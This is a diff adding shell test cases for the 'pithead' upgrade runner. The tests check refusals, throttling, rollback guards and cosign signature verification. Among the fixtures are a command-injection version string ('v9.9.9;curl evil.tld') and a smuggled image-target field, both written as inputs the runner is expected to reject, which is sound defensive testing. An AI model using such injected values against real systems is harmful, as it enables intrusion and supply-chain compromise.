+assert_eq "upgrade on a source checkout is rejected" "$(jq -r '.status' "$RESULTS/$UUPG.json" 2>/dev/null)" "rejected"
+assert_contains "source-checkout refusal points at git pull" "$(jq -r '.error' "$RESULTS/$UUPG.json" 2>/dev/null)" "git pull"
+rm -f "$RESULTS/$UUPG.json"
+
+# Channel off: the runner refuses to process ANYTHING — the intent stays unclaimed, no result.
+seed_upgrade_env false
+reset_upgrade_state
+upgrade_intent "$UUPG" "v9.9.9"
+out="$(urun)"
+assert_rc "upgrade runner refuses when the channel is off" "$?" "1"
+assert_contains "channel-off refusal names the flag" "$out" "not enabled"
+[ -f "$UPGREQS/$UUPG.json" ] && ok "channel-off intent left unclaimed" || bad "channel-off intent left unclaimed" "claimed"
+[ ! -f "$UPGRESULTS/$UUPG.json" ] && ok "channel-off intent gets no result" || bad "channel-off intent gets no result" "result written"
+rm -f "$UPGREQS/$UUPG.json"
+seed_upgrade_env true
+
+# Malformed / missing version: refused BEFORE any network dial (curl must never run).
+reset_upgrade_state
+upgrade_intent "$UUPG" 'v9.9.9;curl evil.tld'
+urun >/dev/null
+assert_eq "shell-metacharacter version is rejected" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "rejected"
+assert_contains "malformed-version rejection names the field" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "version"
+assert_eq "no network dial for a malformed version" "$(cat "$UPG/curl.log" 2>/dev/null)" ""
+reset_upgrade_state
+upgrade_intent "$UUPG"
+urun >/dev/null
+assert_eq "missing version is rejected" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "rejected"
+assert_eq "no network dial for a missing version" "$(cat "$UPG/curl.log" 2>/dev/null)" ""
+
+# A smuggled target field (the image-swap vector): the closed key set refuses the whole request.
+reset_upgrade_state
+printf '{"id":"%s","action":"upgrade","actor":"admin","version":"v9.9.9","target":"evil.tld/img:tag"}\n' "$UUPG" >"$UPGREQS/$UUPG.json"
+urun >/dev/null
+assert_contains "upgrade intent smuggling a target is rejected" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "unexpected keys"
+
+# Forged/stale version: the container proposes v1.9.9 but the host-derived latest is v9.9.9 —
+# refused, nothing downloaded, nothing extracted. The container cannot choose the target.
+reset_upgrade_state
+upgrade_intent "$UUPG" "v1.9.9"
+urun >/dev/null
+assert_eq "container-proposed non-latest version is rejected" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "rejected"
+assert_contains "forged-version rejection names the real latest" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "v9.9.9"
+assert_eq "forged version downloads no bundle" "$(grep -c 'releases/download' "$UPG/curl.log" || true)" "0"
+assert_eq "forged version leaves the install untouched" "$(cat "$UPG/VERSION")" "1.3.1"
+# ...and it still CLAIMED the throttle (stamp taken before the network dial), so a compromised
+# container can't flood well-formed-but-stale intents to grind the GitHub API / beacon over Tor:
+# a second attempt straight after — without reset — is throttled (#59 review, egress-beacon guard).
+upgrade_intent "$UUPG" "v1.9.9"
+urun >/dev/null
+assert_contains "a non-latest attempt still claims the throttle" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "less than 10 minutes"
+
+# Already up to date: latest equals the running version — refused, no download.
+reset_upgrade_state
+printf '{"tag_name":"v1.3.1","html_url":"https://example.invalid/rel"}' >"$UPGB/api-same.json"
+upgrade_intent "$UUPG" "v1.3.1"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api-same.json" \
+    CURL_BUNDLE="$UPGB/bundle.tar.gz" ./pithead control-run-pending >/dev/null 2>&1)
+assert_contains "same-version upgrade is rejected as up to date" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "already up to date"
+
+# Release API unreachable / unusable: refused, nothing changed (fail closed, silent stack).
+reset_upgrade_state
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_FAIL=1 CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api.json" \
+    CURL_BUNDLE="$UPGB/bundle.tar.gz" ./pithead control-run-pending >/dev/null 2>&1)
+assert_contains "unreachable release API rejects the upgrade" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "could not reach"
+reset_upgrade_state
+printf '{"tag_name":"main","html_url":"https://example.invalid/rel"}' >"$UPGB/api-bad.json"
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api-bad.json" \
+    CURL_BUNDLE="$UPGB/bundle.tar.gz" ./pithead control-run-pending >/dev/null 2>&1)
+assert_contains "non-semver API tag rejects the upgrade" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "no usable release tag"
+
+# Bundle download failure AFTER the checks pass: the attempt fails, the stack keeps running.
+reset_upgrade_state
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api.json" \
+    CURL_BUNDLE="$UPGB/missing.tar.gz" ./pithead control-run-pending >/dev/null 2>&1)
+assert_eq "failed bundle download reports failed" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "failed"
+assert_contains "download failure says the stack keeps running" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "keeps running"
+assert_eq "download failure extracts nothing" "$(cat "$UPG/VERSION")" "1.3.1"
+
+# `pithead upgrade` itself fails after extraction: status failed, error points at the host CLI.
+reset_upgrade_state
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" NEW_PITHEAD_FAIL=1 CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api.json" \
+    CURL_BUNDLE="$UPGB/bundle.tar.gz" ./pithead control-run-pending >/dev/null 2>&1)
+assert_eq "failed upgrade run reports failed" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "failed"
+assert_contains "failed upgrade points at the host CLI" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "./pithead upgrade"
+assert_contains "failed upgrade audited" "$(cat "$UPGAUDIT" 2>/dev/null)" "\"action\":\"upgrade\",\"status\":\"failed\""
+
+# Happy path: proposed == host-derived latest and newer than running → bundle extracted, the NEW
+# pithead's `upgrade` ran, both dials went through the stack's Tor SOCKS, everything audited.
+reset_upgrade_state
+: >"$UPGAUDIT"
+upgrade_intent "$UUPG" "v9.9.9"
+out="$(urun)"
+assert_rc "runner exits 0 on a valid upgrade" "$?" "0"
+assert_eq "upgrade result status" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "upgraded"
+assert_eq "upgrade result carries the host-derived version" "$(jq -r '.version' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "v9.9.9"
+assert_eq "bundle extracted over the install" "$(cat "$UPG/VERSION")" "9.9.9"
+assert_contains "the NEW pithead ran the upgrade" "$(cat "$UPG/upgrade-invocations.log" 2>/dev/null)" "new-pithead upgrade"
+assert_eq "both GitHub dials went over Tor SOCKS" "$(grep -c -- '--socks5-hostname 10.9.0.25:9050' "$UPG/curl.log")" "2"
+# #376 fallback: this install has no cosign.pub, so no signature is fetched — today's behaviour.
+assert_eq "no cosign.pub -> no signature dial (documented fallback)" "$(grep -c '\.sig' "$UPG/curl.log" || true)" "0"
+assert_contains "upgrade start audited" "$(cat "$UPGAUDIT")" "\"action\":\"upgrade\",\"status\":\"started\""
+assert_contains "upgrade completion audited" "$(cat "$UPGAUDIT")" "\"action\":\"upgrade\",\"status\":\"upgraded\""
+
+# #376 rollback guard: an attacker who controls the release response serves an OLDER (genuine)
+# bundle at the v9.9.9 URL — its VERSION (1.0.0) does not match the host-derived tag, so the
+# runner refuses BEFORE extraction. A cosign signature binds bytes, not a version, so without
+# this check a validly-signed old bundle would silently downgrade the stack.
+reset_upgrade_state
+mkdir -p "$UPGB/rollback/pithead"
+cp "$UPGB/pithead/pithead" "$UPGB/rollback/pithead/pithead"
+printf '1.0.0' >"$UPGB/rollback/pithead/VERSION"
+tar -czf "$UPGB/rollback.tar.gz" -C "$UPGB/rollback" pithead
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" \
+    CURL_API_RESPONSE="$UPGB/api.json" CURL_BUNDLE="$UPGB/rollback.tar.gz" \
+    ./pithead control-run-pending >/dev/null 2>&1)
+assert_eq "version-mismatched (rollback) bundle is refused" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "failed"
+assert_contains "rollback refusal names the mismatch" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "rollback"
+assert_eq "rollback bundle extracts nothing (VERSION untouched)" "$(cat "$UPG/VERSION")" "1.3.1"
+assert_eq "rollback bundle never ran a new pithead" "$(cat "$UPG/upgrade-invocations.log" 2>/dev/null || echo none)" "none"
+
+# Throttle: a second attempt straight after is refused for 10 minutes (egress-beacon guard).
+# The happy path replaced $U/pithead with the fake bundle's script — restore the real runner
+# (keeping the throttle stamp the successful attempt left behind).
+cp "$STACK" "$UPG/pithead"
+upgrade_intent "$UUPG" "v9.9.9"
+urun >/dev/null
+assert_contains "immediate second upgrade attempt is throttled" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "less than 10 minutes"
+reset_upgrade_state
+
+echo "== black-box: control upgrade verifies the bundle signature (#376) =="
+# Give the install a trust anchor (cosign.pub next to pithead — what a signed release bundle
+# ships) plus a fake cosign; the runner must fetch pithead.tar.gz.sig over the same Tor SOCKS and
+# verify the download against the EXISTING key before a byte of it is extracted.
+cat >"$UPG/bin/cosign" <<'EOF'
+#!/usr/bin/env bash
+echo "[cosign] $*" >>"${COSIGN_LOG:-/dev/null}"
+exit "${COSIGN_RC:-0}"
+EOF
+chmod +x "$UPG/bin/cosign"
+printf 'fake release public key' >"$UPG/cosign.pub"
+printf 'fake signature' >"$UPGB/bundle.sig"
+usign() { # <extra env VAR=val...> — one signed-mode runner invocation
+    (cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" COSIGN_LOG="$UPG/cosign.log" \
+        CURL_API_RESPONSE="$UPGB/api.json" CURL_BUNDLE="$UPGB/bundle.tar.gz" CURL_SIG="$UPGB/bundle.sig" \
+        env "$@" ./pithead control-run-pending 2>&1)
+}
+
+# Valid signature: the upgrade goes through, and the verification demonstrably happened.
+: >"$UPG/cosign.log"
+upgrade_intent "$UUPG" "v9.9.9"
+usign >/dev/null
+assert_eq "signed bundle with a valid signature upgrades" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "upgraded"
+assert_eq "signature fetched over Tor SOCKS" "$(grep -c -- '--socks5-hostname 10.9.0.25:9050.*pithead\.tar\.gz\.sig' "$UPG/curl.log")" "1"
+assert_contains "bundle verified against the existing key, no Rekor" \
+    "$(cat "$UPG/cosign.log")" "verify-blob --key cosign.pub --signature"
+# Bad signature: FAIL CLOSED — nothing extracted, the install untouched. The red test for the
+# control path: bypass the verify-blob call and this goes green-to-broken.
+reset_upgrade_state
+: >"$UPG/cosign.log"
+upgrade_intent "$UUPG" "v9.9.9"
+usign COSIGN_RC=1 >/dev/null
+assert_eq "bad bundle signature reports failed" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "failed"
+assert_contains "bad-signature failure says verification FAILED" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "verification FAILED"
+assert_eq "bad signature extracts nothing" "$(cat "$UPG/VERSION")" "1.3.1"
+[ ! -f "$UPG/upgrade-invocations.log" ] && ok "bad signature never runs the new pithead" || bad "bad signature never runs the new pithead" "it ran"
+
+# Missing signature asset: a signed install refuses a release that carries no .sig (fail closed —
+# a stripped signature must not downgrade verification to nothing).
+reset_upgrade_state
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:$PATH" CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api.json" \
+    CURL_BUNDLE="$UPGB/bundle.tar.gz" CURL_SIG="$UPGB/missing.sig" ./pithead control-run-pending >/dev/null 2>&1)
+assert_eq "missing signature asset reports failed" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "failed"
+assert_contains "missing-signature failure names the asset" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "no bundle signature"
+assert_eq "missing signature extracts nothing" "$(cat "$UPG/VERSION")" "1.3.1"
+
+# cosign.pub present but no cosign binary: refused BEFORE the download, with an install pointer.
+# PATH is pinned to the stub bin + /usr/bin:/bin so a real host cosign can't leak in; jq rides
+# along as a symlink since the pinned PATH may not carry it.
+reset_upgrade_state
+ln -sf "$(command -v jq)" "$UPG/bin/jq"
+rm -f "$UPG/bin/cosign"
+upgrade_intent "$UUPG" "v9.9.9"
+(cd "$UPG" && PATH="$UPG/bin:/usr/bin:/bin" CURL_LOG="$UPG/curl.log" CURL_API_RESPONSE="$UPGB/api.json" \
+    CURL_BUNDLE="$UPGB/bundle.tar.gz" CURL_SIG="$UPGB/bundle.sig" ./pithead control-run-pending >/dev/null 2>&1)
+assert_eq "pubkey without cosign rejects the upgrade" "$(jq -r '.status' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "rejected"
+assert_contains "cosign-missing rejection points at the install doc" "$(jq -r '.error' "$UPGRESULTS/$UUPG.json" 2>/dev/null)" "not installed"
+assert_eq "cosign-missing refusal downloads no bundle" "$(grep -c 'releases/download' "$UPG/curl.log" || true)" "0"
+rm -f "$UPG/cosign.pub" "$UPG/bin/jq"
+reset_upgrade_state
+
+# The runner refuses to run at all when the channel is off (fail-closed).
+control_config main
+"$C/bin/docker" >/dev/null 2>&1 || true
+sed -i.bak 's/"control":{"enabled":true}/"control":{"enabled":false}/' "$C/config.json" 2>/dev/null || true
+(cd "$C" && DOCKER_LOG="$CTRL_LOG" PATH="$C/bin:$PATH" ./pithead apply -y >/dev/null 2>&1)
+out="$(run_pending)"
+assert_rc "runner refuses when the channel is disabled" "$?" "1"
+assert_contains "runner disabled message" "$out" "not enabled"
 
 # ---------------------------------------------------------------------------
 echo ""
